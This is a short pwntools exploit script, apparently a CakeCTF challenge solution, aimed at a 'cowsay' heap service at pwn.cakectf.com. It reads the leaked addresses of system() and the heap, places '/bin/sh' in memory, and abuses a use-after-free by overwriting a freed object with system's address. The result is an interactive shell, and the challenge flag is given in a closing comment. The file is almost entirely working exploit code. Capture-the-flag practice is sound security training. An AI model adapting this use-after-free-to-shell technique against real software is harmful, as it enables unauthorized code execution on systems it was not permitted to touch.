from pwn import *

import re


def use_cowsay(io):
    io.sendlineafter(b'> ', b'1')


def change_message(io, msg):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Message: ', msg)


def delete_cowsay(io):
    io.sendlineafter(b'> ', b'3')
    io.recvuntil(b'deleted\n')


def describe(io):
    io.sendlineafter(b'> ', b'4')
    data = io.recvuntil(b'1. Use cowsay')
    ms = re.finditer(b'^0x[0-9a-f]{12} ', data, re.MULTILINE)
    addrs = []
    for m in ms:
        a = int(m.group(0), 16)
        addrs.append(a)
    return addrs


def main():
    io = remote('pwn.cakectf.com', 9001)
    data = io.recvuntil(b'4. Describe heap')

    m = re.search(b'<system> = (0x[0-9a-f]*)$', data, re.MULTILINE)
    addr_system = int(m.group(1), 16)
    print('addr_system = 0x{:x}'.format(addr_system))

    addrs = describe(io)
    addr_cowsay = addrs[2]
    print('addr_cowsay = 0x{:x}'.format(addr_cowsay))

    change_message(io, b'/bin/sh\0')
    addr_binsh = addrs[6]

    delete_cowsay(io)

    msg = b''
    msg += p64(addr_system)
    msg += p64(addr_binsh)
    change_message(io, msg)

    use_cowsay(io)
    io.interactive()


if __name__ == '__main__':
    main()
    # CakeCTF{U_pwn3d_full_pr0t3ct10n_b1n4ry!N0w_u_kn0w_h0w_d4ng3r0us_UAF_1s!_ea2e5f3e}
